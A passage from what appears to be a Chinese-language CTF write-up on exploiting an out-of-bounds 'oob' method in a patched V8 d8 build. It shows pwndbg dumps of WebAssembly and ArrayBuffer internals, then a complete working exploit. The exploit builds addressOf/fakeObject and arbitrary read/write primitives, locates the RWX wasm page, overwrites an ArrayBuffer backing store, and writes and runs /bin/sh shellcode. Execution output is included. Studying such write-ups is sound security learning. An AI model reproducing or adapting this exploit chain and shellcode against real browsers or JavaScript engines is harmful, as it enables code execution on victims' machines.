<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc611c1</span></span><br><span class="line"></span><br><span class="line">0x7a6bbc611c1: [SharedFunctionInfo] in OldSpace</span><br><span class="line"></span><br><span class="line"> - map: 0x39e2f26009e1 &lt;Map[56]&gt;</span><br><span class="line"></span><br><span class="line"> - name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"></span><br><span class="line"> - function_map_index: 144</span><br><span class="line"></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"></span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"></span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"></span><br><span class="line"> - data: 0x07a6bbc61199 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"></span><br><span class="line"> - code (from data): 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"></span><br><span class="line"> - function token position: -1</span><br><span class="line"></span><br><span class="line"> - start position: -1</span><br><span class="line"></span><br><span class="line"> - end position: -1</span><br><span class="line"></span><br><span class="line"> - no debug info</span><br><span class="line"></span><br><span class="line"> - scope info: 0x39e2f2600c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"></span><br><span class="line"> - length: 0</span><br><span class="line"></span><br><span class="line"> - feedback_metadata: 0x39e2f2602a39: [FeedbackMetadata]</span><br><span class="line"></span><br><span class="line"> - map: 0x39e2f2601319 &lt;Map&gt;</span><br><span class="line"></span><br><span class="line"> - slot_count: 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> pwndbg&gt; </span><span class="language-bash">job 0x07a6bbc61199</span></span><br><span class="line"></span><br><span class="line"> 0x7a6bbc61199: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"></span><br><span class="line"> - map: 0x39e2f2605879 &lt;Map[40]&gt;</span><br><span class="line"></span><br><span class="line"> - wrapper_code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"></span><br><span class="line"> - instance: 0x07a6bbc61001 &lt;Instance map = 0x123928789789&gt;</span><br><span class="line"></span><br><span class="line"> - function_index: 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> pwndbg&gt; </span><span class="language-bash">x/20gx 0x07a6bbc61000</span></span><br><span class="line"></span><br><span class="line">0x7a6bbc61000:  0x0000123928789789  0x000039e2f2600c71</span><br><span class="line"></span><br><span class="line">0x7a6bbc61010:  0x000039e2f2600c71  0x00007f82cc930000</span><br><span class="line"></span><br><span class="line">0x7a6bbc61020:  0x0000000000010000  0x000000000000ffff</span><br><span class="line"></span><br><span class="line">0x7a6bbc61030:  0x0000562dc02eb698  0x000039e2f2600c71</span><br><span class="line"></span><br><span class="line">0x7a6bbc61040:  0x0000562dc036f190  0x000039e2f26004d1</span><br><span class="line"></span><br><span class="line">0x7a6bbc61050:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x7a6bbc61060:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x7a6bbc61070:  0x0000562dc0371740  0x000039e2f26004d1</span><br><span class="line"></span><br><span class="line">0x7a6bbc61080:  0x0000562dc02e19d0  0x00002b7465e6a000 起始地址</span><br><span class="line"></span><br><span class="line">0x7a6bbc61090:  0x00003c59d768f699  0x00003c59d768f909</span><br></pre></td></tr></table></figure>

<p>编写泄露这块内存页的代码 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var instance_addr = addressOf(wasmInstance);</span><br><span class="line"></span><br><span class="line">console.log(&quot;f_addr:0x&quot;+hex(instance_addr));</span><br><span class="line"></span><br><span class="line">var rwx_addr=read64(instance_addr+0x88n-0x1n);</span><br></pre></td></tr></table></figure>

<p>通过ArrayBuffer和DataView可以很方便的处理shellcode,将ArrayBuffer中存储数据的backing_store修改为rwx的内存页 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3d5eba7d0121</span></span><br><span class="line"></span><br><span class="line">0x3d5eba7d0121: [JSArrayBuffer]</span><br><span class="line"></span><br><span class="line"> - map: 0x2f9288cc21b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"></span><br><span class="line"> - prototype: 0x22669038e981 &lt;Object map = 0x2f9288cc2209&gt;</span><br><span class="line"></span><br><span class="line"> - elements: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"></span><br><span class="line"> - embedder fields: 2</span><br><span class="line"></span><br><span class="line"> - backing_store: 0x563b32f3fda0</span><br><span class="line"></span><br><span class="line"> - byte_length: 256</span><br><span class="line"></span><br><span class="line"> - detachable</span><br><span class="line"></span><br><span class="line"> - properties: 0x0b9b83c00c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line"></span><br><span class="line">  0, aligned pointer: (nil)</span><br><span class="line"></span><br><span class="line">  0, aligned pointer: (nil)</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/20gx 0x563b32f3fda0</span></span><br><span class="line"></span><br><span class="line">0x563b32f3fda0:  0xcdcccccccccc0040  0x9a99999999990140</span><br><span class="line"></span><br><span class="line">0x563b32f3fdb0:  0x9a99999999990140  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fdc0:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fdd0:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fde0:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fdf0:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fe00:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fe10:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fe20:  0x0000000000000000  0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x563b32f3fe30:  0x0000000000000000  0x0000000000000000</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x3d5eba7d0120</span></span><br><span class="line"></span><br><span class="line">00:0000│ 0x3d5eba7d0120 —▸ 0x2f9288cc21b9 ◂— 0x800000b9b83c001</span><br><span class="line"></span><br><span class="line">01:0008│ 0x3d5eba7d0128 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008</span><br><span class="line"></span><br><span class="line">02:0010│ 0x3d5eba7d0130 —▸ 0xb9b83c00c71 ◂— 0xb9b83c008</span><br><span class="line"></span><br><span class="line">03:0018│ 0x3d5eba7d0138 ◂— 0x100</span><br><span class="line"></span><br><span class="line">04:0020│ 0x3d5eba7d0140 —▸ 0x563b32f3fda0 ◂— 0xcdcccccccccc0040 /* &#x27;@&#x27; */</span><br><span class="line"></span><br><span class="line">05:0028│ 0x3d5eba7d0148 ◂— 0x2</span><br><span class="line"></span><br><span class="line">06:0030│ 0x3d5eba7d0150 ◂— 0x0</span><br><span class="line"></span><br><span class="line">07:0038│ 0x3d5eba7d0158 ◂— 0x0</span><br></pre></td></tr></table></figure>



<h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(f64.<span class="property">buffer</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [obj];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flo_arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj_arr_map=obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line">flo_arr_map=flo_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> f64[<span class="number">0</span>] = f;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  bigUint64[<span class="number">0</span>] = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//leak obj memory address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line"></span><br><span class="line">  obj_arr[<span class="number">0</span>]=obj;</span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> obj_addr=obj_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">f2i</span>(obj_addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fake obj by addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  flo_arr[<span class="number">0</span>]=<span class="title function_">i2f</span>(addr);</span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> fake_obj=flo_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//recover</span></span><br><span class="line"></span><br><span class="line">  flo_arr.<span class="title function_">oob</span>(flo_arr_map);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> fake_obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line"></span><br><span class="line">  fake_arr[<span class="number">2</span>]=<span class="title function_">i2f</span>(addr-<span class="number">0x10n</span>+<span class="number">0x1n</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;elements:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(fake_arr[<span class="number">2</span>])));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> ret_data=<span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;read addr:0x:&quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; val:0x&quot;</span>+<span class="title function_">hex</span>(ret_data));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret_data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr,data</span>)&#123;</span><br><span class="line"></span><br><span class="line">  fake_arr[<span class="number">2</span>]=<span class="title function_">i2f</span>(addr-<span class="number">0x10n</span>+<span class="number">0x1n</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;elements:0x&quot;</span>+<span class="title function_">hex</span>(<span class="title function_">f2i</span>(fake_arr[<span class="number">2</span>])));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">  fake_obj[<span class="number">0</span>]=<span class="title function_">i2f</span>(data);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;write addr:0x&quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; val:0x&quot;</span>+<span class="title function_">hex</span>(data));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">fake_arr=[</span><br><span class="line"></span><br><span class="line">  flo_arr_map,</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0x41414141n</span>),</span><br><span class="line"></span><br><span class="line">  <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line"></span><br><span class="line"> <span class="number">1.1</span>,</span><br><span class="line"></span><br><span class="line"> <span class="number">2.2</span></span><br><span class="line"></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_addr=<span class="title function_">addressOf</span>(fake_arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//get elements:value &amp; fake obj</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj_addr=fake_addr-<span class="number">0x30n</span>;</span><br><span class="line"></span><br><span class="line">fake_obj=<span class="title function_">fakeObject</span>(fake_obj_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fun = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(wasmInstance);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">addressOf</span>(wasmInstance);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;f_addr:0x&quot;</span>+<span class="title function_">hex</span>(instance_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_addr=<span class="title function_">read64</span>(instance_addr+<span class="number">0x88n</span>-<span class="number">0x1n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line"></span><br><span class="line"> <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line"></span><br><span class="line"> <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line"></span><br><span class="line"> <span class="number">0x050f5e5457525f54n</span></span><br><span class="line"></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//set ArrayBuffer backing_store</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> backing_store_addr= <span class="title function_">addressOf</span>(data_buf)+<span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(backing_store_addr-<span class="number">0x1n</span>,rwx_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//write shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">  data_view.<span class="title function_">setBigUint64</span>(i*<span class="number">8</span>,shellcode[i],<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fun</span>();</span><br><span class="line"></span><br><span class="line">v8 <span class="attr">git</span>:(6dc88c191f) ✗ ./out/x64_startctf.<span class="property">release</span>/d8 --allow-natives-syntax ./test.<span class="property">js</span></span><br><span class="line"></span><br><span class="line"><span class="attr">f_addr</span>:<span class="number">0x14a0c25a1e69</span></span><br><span class="line"></span><br><span class="line"><span class="attr">elements</span>:<span class="number">0x14a0c25a1ee1</span></span><br><span class="line"></span><br><span class="line">read <span class="attr">addr</span>:0<span class="attr">x</span>:14a0c25a1ef0 <span class="attr">val</span>:<span class="number">0x326e60143000</span></span><br><span class="line"></span><br><span class="line"><span class="attr">elements</span>:<span class="number">0x725e5110161</span></span><br><span class="line"></span><br><span class="line">write <span class="attr">addr</span>:<span class="number">0x725e5110170</span> <span class="attr">val</span>:<span class="number">0x326e60143000</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br><span class="line"></span><br><span class="line">Filesystem   Size Used Avail Use% Mounted on</span><br><span class="line"></span><br><span class="line">udev      3.9G   0 3.9G  0% /dev</span><br><span class="line"></span><br><span class="line">tmpfs      793M 2.0M 791M  1% /run</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="prev" title="CVE-2021-26411漏洞分析报告">
      <i class="fa fa-chevron-left"></i> CVE-2021-26411漏洞分析报告
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/12/27/Fuzzing101__01/" rel="next" title="Fuzzing101_01">
      Fuzzing101_01 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
